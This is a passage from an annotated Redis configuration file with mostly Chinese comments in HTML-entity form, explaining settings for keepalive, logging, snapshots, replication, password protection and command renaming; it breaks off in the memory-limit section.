0&#x662F;&#x5173;&#x95ED;&#x6B64;&#x8BBE;&#x7F6E;timeout 0# tcp &#x5FC3;&#x8DF3;&#x5305;&#x3002;## &#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;&#x975E;&#x96F6;&#xFF0C;&#x5219;&#x5728;&#x4E0E;&#x5BA2;&#x6237;&#x7AEF;&#x7F3A;&#x4E4F;&#x901A;&#x8BAF;&#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528; SO_KEEPALIVE &#x53D1;&#x9001; tcp acks &#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;# &#x8FD9;&#x4E2A;&#x4E4B;&#x6240;&#x6709;&#x6709;&#x7528;&#xFF0C;&#x4E3B;&#x8981;&#x7531;&#x4E24;&#x4E2A;&#x539F;&#x56E0;&#xFF1A;## 1) &#x9632;&#x6B62;&#x6B7B;&#x7684; peers# 2) Take the connection alive from the point of view of network# equipment in the middle.## On Linux, the specified value (in seconds) is the period used to send ACKs.# Note that to close the connection the double of the time is needed.# On other kernels the period depends on the kernel configuration.## A reasonable value for this option is 60 seconds.# &#x63A8;&#x8350;&#x4E00;&#x4E2A;&#x5408;&#x7406;&#x7684;&#x503C;&#x5C31;&#x662F;60&#x79D2;tcp-keepalive 0# &#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x7EA7;&#x522B;# Redis&#x603B;&#x5171;&#x652F;&#x6301;&#x56DB;&#x4E2A;&#x7EA7;&#x522B;&#xFF1A;debug&#x3001;verbose&#x3001;notice&#x3001;warning&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;verbose# debug &#x8BB0;&#x5F55;&#x5F88;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x7528;&#x4E8E;&#x5F00;&#x53D1;&#x548C;&#x6D4B;&#x8BD5;# varbose &#x6709;&#x7528;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x4E0D;&#x50CF;debug&#x4F1A;&#x8BB0;&#x5F55;&#x90A3;&#x4E48;&#x591A;# notice &#x666E;&#x901A;&#x7684;verbose&#xFF0C;&#x5E38;&#x7528;&#x4E8E;&#x751F;&#x4EA7;&#x73AF;&#x5883;# warning &#x53EA;&#x6709;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x6216;&#x8005;&#x4E25;&#x91CD;&#x7684;&#x4FE1;&#x606F;&#x4F1A;&#x8BB0;&#x5F55;&#x5230;&#x65E5;&#x5FD7;loglevel debug# &#x914D;&#x7F6E;log&#x6587;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x4E0D;&#x540C;&#x7684;redis&#x5B9E;&#x4F8B;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x95EE;&#x9898;&#x5B9A;&#x4F4D;# &#x9ED8;&#x8BA4;&#x503C;&#x4E3A;stdout&#xFF0C;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF0C;&#x82E5;&#x540E;&#x53F0;&#x6A21;&#x5F0F;&#x4F1A;&#x8F93;&#x51FA;&#x5230;/dev/null# logfile stdoutlogfile /var/log/redis/redis.log# &#x8981;&#x60F3;&#x628A;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x5230;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#xFF0C;&#x5C31;&#x628A;&#x5B83;&#x6539;&#x6210; yes&#xFF0C;# &#x4E5F;&#x53EF;&#x4EE5;&#x53EF;&#x9009;&#x62E9;&#x6027;&#x7684;&#x66F4;&#x65B0;&#x5176;&#x4ED6;&#x7684;syslog &#x53C2;&#x6570;&#x4EE5;&#x8FBE;&#x5230;&#x4F60;&#x7684;&#x8981;&#x6C42;# syslog-enabled no# &#x8BBE;&#x7F6E; syslog &#x7684; identity&#x3002;# syslog-ident redis # &#x8BBE;&#x7F6E; syslog &#x7684; facility&#xFF0C;&#x5FC5;&#x987B;&#x662F; USER &#x6216;&#x8005;&#x662F; LOCAL0-LOCAL7 &#x4E4B;&#x95F4;&#x7684;&#x503C;&#x3002;# syslog-facility local0# &#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x76EE;&#x3002;# &#x9ED8;&#x8BA4;&#x6570;&#x636E;&#x5E93;&#x662F; DB 0&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x5728;&#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x4E0A;&#x4F7F;&#x7528; select &lt;dbid&gt; &#x547D;&#x4EE4;&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;# &#x4F46;&#x662F; dbid &#x5FC5;&#x987B;&#x662F;&#x4E00;&#x4E2A;&#x4ECB;&#x4E8E; 0 &#x5230; databasees - 1 &#x4E4B;&#x95F4;&#x7684;&#x503C;databases 16################################ &#x5FEB;&#x7167; ################################### &#x5B58; DB &#x5230;&#x78C1;&#x76D8;&#xFF1A;## &#x683C;&#x5F0F;&#xFF1A;save &lt;&#x95F4;&#x9694;&#x65F6;&#x95F4;&#xFF08;&#x79D2;&#xFF09;&gt; &lt;&#x5199;&#x5165;&#x6B21;&#x6570;&gt;## &#x6839;&#x636E;&#x7ED9;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x548C;&#x5199;&#x5165;&#x6B21;&#x6570;&#x5C06;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5230;&#x78C1;&#x76D8;## &#x4E0B;&#x9762;&#x7684;&#x4F8B;&#x5B50;&#x7684;&#x610F;&#x601D;&#x662F;&#xFF1A;# 900 &#x79D2;&#x5185;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709; 1 &#x4E2A; key &#x7684;&#x503C;&#x53D8;&#x5316;&#xFF0C;&#x5219;&#x4FDD;&#x5B58;# 300 &#x79D2;&#x5185;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709; 10 &#x4E2A; key &#x7684;&#x503C;&#x53D8;&#x5316;&#xFF0C;&#x5219;&#x4FDD;&#x5B58;# 60 &#x79D2;&#x5185;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709; 10000 &#x4E2A; key &#x7684;&#x503C;&#x53D8;&#x5316;&#xFF0C;&#x5219;&#x4FDD;&#x5B58;#&#x3000;&#x3000;# &#x6CE8;&#x610F;&#xFF1A;&#x4F60;&#x53EF;&#x4EE5;&#x6CE8;&#x91CA;&#x6389;&#x6240;&#x6709;&#x7684; save &#x884C;&#x6765;&#x505C;&#x7528;&#x4FDD;&#x5B58;&#x529F;&#x80FD;&#x3002;# &#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4E00;&#x4E2A;&#x7A7A;&#x5B57;&#x7B26;&#x4E32;&#x6765;&#x5B9E;&#x73B0;&#x505C;&#x7528;&#xFF1A;# save &quot;&quot; save 900 1save 300 10save 60 10000# &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C; redis &#x6700;&#x540E;&#x4E00;&#x6B21;&#x7684;&#x540E;&#x53F0;&#x4FDD;&#x5B58;&#x5931;&#x8D25;&#xFF0C;redis &#x5C06;&#x505C;&#x6B62;&#x63A5;&#x53D7;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;# &#x8FD9;&#x6837;&#x4EE5;&#x4E00;&#x79CD;&#x5F3A;&#x786C;&#x7684;&#x65B9;&#x5F0F;&#x8BA9;&#x7528;&#x6237;&#x77E5;&#x9053;&#x6570;&#x636E;&#x4E0D;&#x80FD;&#x6B63;&#x786E;&#x7684;&#x6301;&#x4E45;&#x5316;&#x5230;&#x78C1;&#x76D8;&#xFF0C;# &#x5426;&#x5219;&#x5C31;&#x4F1A;&#x6CA1;&#x4EBA;&#x6CE8;&#x610F;&#x5230;&#x707E;&#x96BE;&#x7684;&#x53D1;&#x751F;&#x3002;## &#x5982;&#x679C;&#x540E;&#x53F0;&#x4FDD;&#x5B58;&#x8FDB;&#x7A0B;&#x91CD;&#x65B0;&#x542F;&#x52A8;&#x5DE5;&#x4F5C;&#x4E86;&#xFF0C;redis &#x4E5F;&#x5C06;&#x81EA;&#x52A8;&#x7684;&#x5141;&#x8BB8;&#x5199;&#x64CD;&#x4F5C;&#x3002;## &#x7136;&#x800C;&#x4F60;&#x8981;&#x662F;&#x5B89;&#x88C5;&#x4E86;&#x9760;&#x8C31;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x4F60;&#x53EF;&#x80FD;&#x4E0D;&#x5E0C;&#x671B; redis &#x8FD9;&#x6837;&#x505A;&#xFF0C;&#x90A3;&#x4F60;&#x5C31;&#x6539;&#x6210; no &#x597D;&#x4E86;&#x3002;stop-writes-on-bgsave-error yes # &#x662F;&#x5426;&#x5728; dump .rdb &#x6570;&#x636E;&#x5E93;&#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528; LZF &#x538B;&#x7F29;&#x5B57;&#x7B26;&#x4E32;# &#x9ED8;&#x8BA4;&#x90FD;&#x8BBE;&#x4E3A; yes# &#x5982;&#x679C;&#x4F60;&#x5E0C;&#x671B;&#x4FDD;&#x5B58;&#x5B50;&#x8FDB;&#x7A0B;&#x8282;&#x7701;&#x70B9; cpu &#xFF0C;&#x4F60;&#x5C31;&#x8BBE;&#x7F6E;&#x5B83;&#x4E3A; no &#xFF0C;# &#x4E0D;&#x8FC7;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x96C6;&#x53EF;&#x80FD;&#x5C31;&#x4F1A;&#x6BD4;&#x8F83;&#x5927;rdbcompression yes# &#x662F;&#x5426;&#x6821;&#x9A8C;rdb&#x6587;&#x4EF6;rdbchecksum yes# &#x672C;&#x5730;&#x6301;&#x4E45;&#x5316;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;dump.rdb# &#x4E0D;&#x540C;&#x7684;redis&#x5B9E;&#x4F8B;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;db&#x6587;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x95EE;&#x9898;&#x5B9A;&#x4F4D;dbfilename dump.rdb# &#x5DE5;&#x4F5C;&#x76EE;&#x5F55;## &#x6570;&#x636E;&#x5E93;&#x955C;&#x50CF;&#x5907;&#x4EFD;&#x7684;&#x6587;&#x4EF6;&#x653E;&#x7F6E;&#x7684;&#x8DEF;&#x5F84;&#x3002;# &#x8FD9;&#x91CC;&#x7684;&#x8DEF;&#x5F84;&#x8DDF;&#x6587;&#x4EF6;&#x540D;&#x8981;&#x5206;&#x5F00;&#x914D;&#x7F6E;&#x662F;&#x56E0;&#x4E3A;redis&#x5728;&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#x65F6;&#xFF0C;&#x5148;&#x4F1A;&#x5C06;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x7684;&#x72B6;&#x6001;&#x5199;&#x5165;&#x5230;&#x4E00;&#x4E2A;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x7B49;&#x5907;&#x4EFD;&#x5B8C;&#x6210;&#x65F6;&#xFF0C;# &#x518D;&#x628A;&#x8BE5;&#x8BE5;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x66FF;&#x6362;&#x4E3A;&#x4E0A;&#x9762;&#x6240;&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x8FD9;&#x91CC;&#x7684;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x548C;&#x4E0A;&#x9762;&#x6240;&#x914D;&#x7F6E;&#x7684;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x90FD;&#x4F1A;&#x653E;&#x5728;&#x8FD9;&#x4E2A;&#x6307;&#x5B9A;&#x7684;&#x8DEF;&#x5F84;&#x5F53;&#x4E2D;&#x3002;# # AOF&#x6587;&#x4EF6;&#x4E5F;&#x4F1A;&#x5B58;&#x653E;&#x5728;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x9762;# # &#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x5FC5;&#x987B;&#x5236;&#x5B9A;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x800C;&#x4E0D;&#x662F;&#x6587;&#x4EF6;## &#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;&#x201C;./&#x201D;&#xFF0C;&#x6700;&#x597D;&#x6539;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x4E3A;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;# &#x5982;&#x679C;&#x4E3A;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;redis&#x5728;&#x54EA;&#x91CC;&#x542F;&#x52A8;&#xFF0C;dump.rdb&#x6587;&#x4EF6;&#x5C31;&#x4F1A;&#x4EA7;&#x751F;&#x5728;&#x542F;&#x52A8;&#x7684;&#x76EE;&#x5F55;# &#x8FD9;&#x4E5F;&#x5C31;&#x662F;&#x6709;&#x4E9B;&#x4EBA;&#x91CD;&#x542F;redis&#x540E;key&#x503C;&#x6D88;&#x5931;&#x7684;&#x539F;&#x56E0;#dir ./################################# &#x4E3B;&#x4ECE;&#x590D;&#x5236; ################################## &#x4E3B;&#x4ECE;&#x590D;&#x5236;. &#x8BBE;&#x7F6E;&#x8BE5;&#x6570;&#x636E;&#x5E93;&#x4E3A;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4ECE;&#x6570;&#x636E;&#x5E93;. # &#x8BBE;&#x7F6E;&#x5F53;&#x672C;&#x673A;&#x4E3A;slav&#x670D;&#x52A1;&#x65F6;&#xFF0C;&#x8BBE;&#x7F6E;master&#x670D;&#x52A1;&#x7684;IP&#x5730;&#x5740;&#x53CA;&#x7AEF;&#x53E3;&#xFF0C;&#x5728;Redis&#x542F;&#x52A8;&#x65F6;&#xFF0C;&#x5B83;&#x4F1A;&#x81EA;&#x52A8;&#x4ECE;master&#x8FDB;&#x884C;&#x6570;&#x636E;&#x540C;&#x6B65;#slaveof &lt;masterip&gt; &lt;masterport&gt;# &#x5F53;master&#x670D;&#x52A1;&#x8BBE;&#x7F6E;&#x4E86;&#x5BC6;&#x7801;&#x4FDD;&#x62A4;&#x65F6;(&#x7528;requirepass&#x5236;&#x5B9A;&#x7684;&#x5BC6;&#x7801;)# slav&#x670D;&#x52A1;&#x8FDE;&#x63A5;master&#x7684;&#x5BC6;&#x7801;# masterauth &lt;master-password&gt;# &#x5F53;&#x4ECE;&#x5E93;&#x540C;&#x4E3B;&#x673A;&#x5931;&#x53BB;&#x8FDE;&#x63A5;&#x6216;&#x8005;&#x590D;&#x5236;&#x6B63;&#x5728;&#x8FDB;&#x884C;&#xFF0C;&#x4ECE;&#x673A;&#x5E93;&#x6709;&#x4E24;&#x79CD;&#x8FD0;&#x884C;&#x65B9;&#x5F0F;&#xFF1A;## 1) &#x5982;&#x679C;slave-serve-stale-data&#x8BBE;&#x7F6E;&#x4E3A;yes(&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;)&#xFF0C;&#x4ECE;&#x5E93;&#x4F1A;&#x7EE7;&#x7EED;&#x76F8;&#x5E94;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BF7;&#x6C42;# # 2) &#x5982;&#x679C;slave-serve-stale-data&#x662F;&#x6307;&#x4E3A;no&#xFF0C;&#x51FA;&#x53BB;INFO&#x548C;SLAVOF&#x547D;&#x4EE4;&#x4E4B;&#x5916;&#x7684;&#x4EFB;&#x4F55;&#x8BF7;&#x6C42;&#x90FD;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;# &#x9519;&#x8BEF;&quot;SYNC with master in progress&quot;#slave-serve-stale-data yes# &#x4F60;&#x53EF;&#x4EE5;&#x914D;&#x7F6E;&#x4E00;&#x4E2A; slave &#x5B9E;&#x4F53;&#x662F;&#x5426;&#x63A5;&#x53D7;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#x3002;# &#x901A;&#x8FC7;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#x6765;&#x5B58;&#x50A8;&#x4E00;&#x4E9B;&#x77ED;&#x6682;&#x7684;&#x6570;&#x636E;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A; slave &#x5B9E;&#x4F8B;&#x6765;&#x8BF4;&#x53EF;&#x80FD;&#x662F;&#x6709;&#x7528;&#x7684;&#xFF0C;# &#x56E0;&#x4E3A;&#x76F8;&#x5BF9;&#x4ECE; master &#x91CD;&#x65B0;&#x540C;&#x6B65;&#x6570;&#x800C;&#x8A00;&#xFF0C;&#x636E;&#x6570;&#x636E;&#x5199;&#x5165;&#x5230; slave &#x4F1A;&#x66F4;&#x5BB9;&#x6613;&#x88AB;&#x5220;&#x9664;&#x3002;# &#x4F46;&#x662F;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x56E0;&#x4E3A;&#x4E00;&#x4E2A;&#x9519;&#x8BEF;&#x7684;&#x914D;&#x7F6E;&#x5199;&#x5165;&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#x3002;## &#x4ECE; redis 2.6 &#x7248;&#x8D77;&#xFF0C;&#x9ED8;&#x8BA4; slaves &#x90FD;&#x662F;&#x53EA;&#x8BFB;&#x7684;&#x3002;## Note: read only slaves are not designed to be exposed to untrusted clients# on the internet. It&apos;s just a protection layer against misuse of the instance.# Still a read only slave exports by default all the administrative commands# such as CONFIG, DEBUG, and so forth. To a limited extent you can improve# security of read only slaves using &apos;rename-command&apos; to shadow all the# administrative / dangerous commands.# &#x6CE8;&#x610F;&#xFF1A;&#x53EA;&#x8BFB;&#x7684; slaves &#x6CA1;&#x6709;&#x88AB;&#x8BBE;&#x8BA1;&#x6210;&#x5728; internet &#x4E0A;&#x66B4;&#x9732;&#x7ED9;&#x4E0D;&#x53D7;&#x4FE1;&#x4EFB;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x3002;# &#x5B83;&#x4EC5;&#x4EC5;&#x662F;&#x4E00;&#x4E2A;&#x9488;&#x5BF9;&#x8BEF;&#x7528;&#x5B9E;&#x4F8B;&#x7684;&#x4E00;&#x4E2A;&#x4FDD;&#x62A4;&#x5C42;&#x3002;slave-read-only yes# Slaves &#x5728;&#x4E00;&#x4E2A;&#x9884;&#x5B9A;&#x4E49;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x5185;&#x53D1;&#x9001; ping &#x547D;&#x4EE4;&#x5230; server &#x3002;# &#x4F60;&#x53EF;&#x4EE5;&#x6539;&#x53D8;&#x8FD9;&#x4E2A;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x3002;&#x9ED8;&#x8BA4;&#x4E3A; 10 &#x79D2;&#x3002;## repl-ping-slave-period 10# The following option sets the replication timeout for:# &#x8BBE;&#x7F6E;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x671F;&#x65F6;&#x95F4;## 1) Bulk transfer I/O during SYNC, from the point of view of slave.# 2) Master timeout from the point of view of slaves (data, pings).# 3) Slave timeout from the point of view of masters (REPLCONF ACK pings).## It is important to make sure that this value is greater than the value# specified for repl-ping-slave-period otherwise a timeout will be detected# every time there is low traffic between the master and the slave.# &#x8FD9;&#x4E2A;&#x503C;&#x4E00;&#x5B9A;&#x8981;&#x6BD4; repl-ping-slave-period &#x5927;## repl-timeout 60 # Disable TCP_NODELAY on the slave socket after SYNC?## If you select &quot;yes&quot; Redis will use a smaller number of TCP packets and# less bandwidth to send data to slaves. But this can add a delay for# the data to appear on the slave side, up to 40 milliseconds with# Linux kernels using a default configuration.## If you select &quot;no&quot; the delay for data to appear on the slave side will# be reduced but more bandwidth will be used for replication.## By default we optimize for low latency, but in very high traffic conditions# or when the master and slaves are many hops away, turning this to &quot;yes&quot; may# be a good idea.repl-disable-tcp-nodelay no # &#x8BBE;&#x7F6E;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x5BB9;&#x91CF;&#x5927;&#x5C0F;&#x3002;&#x8FD9;&#x4E2A; backlog &#x662F;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x5728; slaves &#x88AB;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x65F6;# &#x5B58;&#x653E; slave &#x6570;&#x636E;&#x7684; buffer&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x4E00;&#x4E2A; slave &#x60F3;&#x8981;&#x91CD;&#x65B0;&#x8FDE;&#x63A5;&#xFF0C;&#x901A;&#x5E38;&#x4E0D;&#x5E0C;&#x671B;&#x5168;&#x90E8;&#x91CD;&#x65B0;&#x540C;&#x6B65;&#xFF0C;# &#x53EA;&#x662F;&#x90E8;&#x5206;&#x540C;&#x6B65;&#x5C31;&#x591F;&#x4E86;&#xFF0C;&#x4EC5;&#x4EC5;&#x4F20;&#x9012; slave &#x5728;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x65F6;&#x4E22;&#x5931;&#x7684;&#x8FD9;&#x90E8;&#x5206;&#x6570;&#x636E;&#x3002;## The biggest the replication backlog, the longer the time the slave can be# disconnected and later be able to perform a partial resynchronization.# &#x8FD9;&#x4E2A;&#x503C;&#x8D8A;&#x5927;&#xFF0C;salve &#x53EF;&#x4EE5;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x7684;&#x65F6;&#x95F4;&#x5C31;&#x8D8A;&#x957F;&#x3002;## The backlog is only allocated once there is at least a slave connected.## repl-backlog-size 1mb # After a master has no longer connected slaves for some time, the backlog# will be freed. The following option configures the amount of seconds that# need to elapse, starting from the time the last slave disconnected, for# the backlog buffer to be freed.# &#x5728;&#x67D0;&#x4E9B;&#x65F6;&#x5019;&#xFF0C;master &#x4E0D;&#x518D;&#x8FDE;&#x63A5; slaves&#xFF0C;backlog &#x5C06;&#x88AB;&#x91CA;&#x653E;&#x3002;## A value of 0 means to never release the backlog.# &#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A; 0 &#xFF0C;&#x610F;&#x5473;&#x7740;&#x7EDD;&#x4E0D;&#x91CA;&#x653E; backlog &#x3002;## repl-backlog-ttl 3600 # &#x5F53; master &#x4E0D;&#x80FD;&#x6B63;&#x5E38;&#x5DE5;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#xFF0C;Redis Sentinel &#x4F1A;&#x4ECE; slaves &#x4E2D;&#x9009;&#x51FA;&#x4E00;&#x4E2A;&#x65B0;&#x7684; master&#xFF0C;# &#x8FD9;&#x4E2A;&#x503C;&#x8D8A;&#x5C0F;&#xFF0C;&#x5C31;&#x8D8A;&#x4F1A;&#x88AB;&#x4F18;&#x5148;&#x9009;&#x4E2D;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x662F; 0 &#xFF0C; &#x90A3;&#x662F;&#x610F;&#x5473;&#x7740;&#x8FD9;&#x4E2A; slave &#x4E0D;&#x53EF;&#x80FD;&#x88AB;&#x9009;&#x4E2D;&#x3002;## &#x9ED8;&#x8BA4;&#x4F18;&#x5148;&#x7EA7;&#x4E3A; 100&#x3002;slave-priority 100 # It is possible for a master to stop accepting writes if there are less than# N slaves connected, having a lag less or equal than M seconds.## The N slaves need to be in &quot;online&quot; state.## The lag in seconds, that must be &lt;= the specified value, is calculated from# the last ping received from the slave, that is usually sent every second.## This option does not GUARANTEES that N replicas will accept the write, but# will limit the window of exposure for lost writes in case not enough slaves# are available, to the specified number of seconds.## For example to require at least 3 slaves with a lag &lt;= 10 seconds use:## min-slaves-to-write 3# min-slaves-max-lag 10## Setting one or the other to 0 disables the feature.## By default min-slaves-to-write is set to 0 (feature disabled) and# min-slaves-max-lag is set to 10. ################################## &#x5B89;&#x5168; ################################### # &#x8BBE;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x540E;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x5176;&#x4ED6;&#x6307;&#x5B9A;&#x524D;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7684;&#x5BC6;&#x7801;&#x3002;# &#x8B66;&#x544A;&#xFF1A;&#x56E0;&#x4E3A;redis&#x901F;&#x5EA6;&#x76F8;&#x5F53;&#x5FEB;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x4E00;&#x53F0;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0B;&#xFF0C;&#x4E00;&#x4E2A;&#x5916;&#x90E8;&#x7684;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x5728;&#x4E00;&#x79D2;&#x949F;&#x8FDB;&#x884C;150K&#x6B21;&#x7684;&#x5BC6;&#x7801;&#x5C1D;&#x8BD5;&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x4F60;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x975E;&#x5E38;&#x975E;&#x5E38;&#x5F3A;&#x5927;&#x7684;&#x5BC6;&#x7801;&#x6765;&#x9632;&#x6B62;&#x66B4;&#x529B;&#x7834;&#x89E3;#requirepass foobared # &#x547D;&#x4EE4;&#x91CD;&#x547D;&#x540D;.## &#x5728;&#x4E00;&#x4E2A;&#x5171;&#x4EAB;&#x73AF;&#x5883;&#x4E0B;&#x53EF;&#x4EE5;&#x91CD;&#x547D;&#x540D;&#x76F8;&#x5BF9;&#x5371;&#x9669;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x6BD4;&#x5982;&#x628A;CONFIG&#x91CD;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x4E0D;&#x5BB9;&#x6613;&#x731C;&#x6D4B;&#x7684;&#x5B57;&#x7B26;&#x3002;## &#x4E3E;&#x4F8B;:## rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52## &#x5982;&#x679C;&#x60F3;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#xFF0C;&#x76F4;&#x63A5;&#x628A;&#x5B83;&#x91CD;&#x547D;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x7A7A;&#x5B57;&#x7B26;&quot;&quot;&#x5373;&#x53EF;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;## rename-command CONFIG &quot;&quot;## Please note that changing the name of commands that are logged into the# AOF file or transmitted to slaves may cause problems.################################### &#x7EA6;&#x675F; #################################### # &#x8BBE;&#x7F6E;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x6700;&#x5927;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x6570;&#xFF0C;&#x9ED8;&#x8BA4;&#x65E0;&#x9650;&#x5236;&#xFF0C;Redis&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x6253;&#x5F00;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x6570;&#x4E3A;Redis&#x8FDB;&#x7A0B;&#x53EF;&#x4EE5;&#x6253;&#x5F00;&#x7684;&#x6700;&#x5927;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x6570;&#xFF0C;# &#x5982;&#x679C;&#x8BBE;&#x7F6E; maxclients 0&#xFF0C;&#x8868;&#x793A;&#x4E0D;&#x4F5C;&#x9650;&#x5236;&#x3002;# &#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x6570;&#x5230;&#x8FBE;&#x9650;&#x5236;&#x65F6;&#xFF0C;Redis&#x4F1A;&#x5173;&#x95ED;&#x65B0;&#x7684;&#x8FDE;&#x63A5;&#x5E76;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x8FD4;&#x56DE;max number of clients reached&#x9519;&#x8BEF;&#x4FE1;&#x606F;## maxclients 128 # &#x6307;&#x5B9A;Redis&#x6700;&#x5927;&#x5185;&#x5B58;&#x9650;&#x5236;&#xFF0C;Redis&#x5728;&#x542F;&#x52A8;&#x65F6;&#x4F1A;&#x628A;&#x6570;&#x636E;&#x52A0;&#x8F7D;&#x5230;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x8FBE;&#x5230;&#x6700;&#x5927;&#x5185;&#x5B58;&#x540E;&#xFF0C;Redis&#x4F1A;&#x5148;&#x5C1D;&#x8BD5;&#x6E05;&#x9664;&#x5DF2;&#x5230;&#x671F;&#x6216;&#x5373;&#x5C06;&#x5230;&#x671F;&#x7684;Key# Redis&#x540C;&#x65F6;&#x4E5F;&#x4F1A;&#x79FB;&#x9664;&#x7A7A;&#x7684;list&#x5BF9;&#x8C61;## &#x5F53;&#x6B64;&#x65B9;&#x6CD5;&#x5904;&#x7406;&#x540E;&#xFF0C;&#x4ECD;&#x7136;&#x5230;&#x8FBE;&#x6700;&#x5927;&#x5185;&#x5B58;&#x8BBE;&#x7F6E;&#xFF0C;&#x5C06;&#x65E0;&#x6CD5;&#x518D;&#x8FDB;&#x884C;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#xFF0C;&#x4F46;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x8BFB;&#x53D6;&#x64CD;&#x4F5C;# # 